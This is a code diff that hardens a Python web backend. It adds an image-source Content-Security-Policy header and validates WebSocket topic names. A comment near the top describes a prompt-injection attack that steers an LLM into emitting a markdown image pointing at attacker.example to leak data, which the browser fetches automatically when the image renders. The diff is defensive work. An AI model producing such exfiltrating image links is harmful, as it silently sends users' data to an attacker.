@@ -105,6 +105,33 @@ _LOOPBACK_HOST = "127.0.0.1"
 # already required, not a second env var for the same real workflow.
 DEV_WS_ORIGIN_ENV = "GRAPHLINK_DEV_WS_ORIGIN"
 
+# SECURITY-FIX (finding markdown-image-exfil): every text-bearing node
+# (Chat/Conversation/WebResearch/Artifact/...) renders LLM/web-authored
+# markdown through NodeMarkdown.tsx/DocumentViewMarkdown.tsx, whose `img`
+# override spreads a markdown-supplied `src` straight onto a real `<img>`.
+# react-markdown's own default urlTransform permits any http(s) URL by
+# design, and the browser fetches an `<img src>` automatically at RENDER
+# TIME - no click required, unlike the sibling `<a>` link path. A prompt
+# injection that steers the model into emitting
+# `![](https://attacker.example/x?leak=<data>)` therefore gets a silent,
+# automatic GET to an arbitrary attacker-chosen host the instant the node
+# renders. NodeMarkdown/DocumentViewMarkdown now also reject non-http(s)
+# `src` schemes the same way the existing SafeAnchor link guard does (see
+# those files), but neither can restrict WHICH http(s) host an image may
+# be fetched from - that is a network-layer decision, not a component-
+# level one. This CSP is that network-layer close: img-src 'self'
+# restricts image fetches to this app's own origin (covers the legitimate
+# /api/assets/{id} route), and 'data:' additionally covers html-to-image's
+# own internal `new Image()` load of a `data:image/svg+xml` document
+# during canvas PNG export (exportCanvasPng.ts) - confirmed as the only
+# `data:image` use anywhere in web_ui/src before adding it here. No other
+# directive is set: this app has shipped with NO Content-Security-Policy
+# at all until now, so a broader lockdown (default-src/script-src/etc.)
+# risks breaking the SPA's own legitimate script/style loading in ways
+# that cannot be verified without a real browser - deliberately scoped to
+# just the directive this finding is actually about.
+CONTENT_SECURITY_POLICY = "img-src 'self' data:"
+
 
 def _is_allowed_ws_origin(origin: str | None, host_header: str | None, dev_proxy_origin: str | None = None) -> bool:
     """Handshake-time allowlist for the /ws WebSocket Origin header.
@@ -283,7 +310,7 @@ def _configure_session(
     # real banner (same load-bearing ordering precedent as register_plugins/
     # register_chat_library above - notifications_state already exists by
     # this point in every case).
-    register_settings(bus, settings_manager, notifications_state)
+    register_settings(bus, settings_manager, notifications_state, agent_dispatcher)
     # R6.4: register_chat_library needs the same session's canvas_document
     # (built above) so loadChat can actually restore a session into it, and
     # notifications_state so a failed/empty load can surface a real banner -
@@ -738,8 +765,18 @@ def create_app(
         async def spa(full_path: str) -> FileResponse:
             candidate = (resolved_spa / full_path).resolve()
             if full_path and candidate.is_file() and candidate.is_relative_to(resolved_spa.resolve()):
-                return FileResponse(candidate)
-            return FileResponse(resolved_spa / "index.html")
+                response = FileResponse(candidate)
+            else:
+                response = FileResponse(resolved_spa / "index.html")
+            # SECURITY-FIX (markdown-image-exfil): see CONTENT_SECURITY_POLICY's
+            # own module-level comment above for the full mechanism this closes.
+            # Attached directly to the response object (this route's own two
+            # FileResponse branches are the only place the SPA document itself
+            # is served - unlike require_capability_token/require_loopback_origin
+            # above, which gate a shared set of paths uniformly, this header only
+            # ever needs to reach the document responses this handler returns).
+            response.headers["Content-Security-Policy"] = CONTENT_SECURITY_POLICY
+            return response
     else:
         logger.warning("SPA build not found at %s - only /api and /ws are served", resolved_spa)
 
@@ -784,6 +821,19 @@ async def _handle_message(session: SessionBus, websocket: WebSocket, message: di
             )
             return
         for topic in topics:
+            # SECURITY-FIX: `topics` was checked to be a list, but not that
+            # each ELEMENT is a hashable/string topic name. A subscribe frame
+            # like {"topics": [{}]} passed the list check and reached
+            # send_snapshot -> self._topics.get(topic), which raised
+            # TypeError('unhashable type: dict') - not UnknownTopicError, so
+            # it escaped the except clause below uncaught and killed the
+            # connection, the exact "malformed input drops the socket"
+            # failure this function's own adjacent REVIEW-FIXes all close.
+            if not isinstance(topic, str):
+                await websocket.send_json(
+                    {"kind": "error", "id": msg_id, "error": "malformed message: each topic must be a string"}
+                )
+                continue
             try:
                 await session.send_snapshot(topic, websocket, request_id=msg_id)
             except UnknownTopicError:
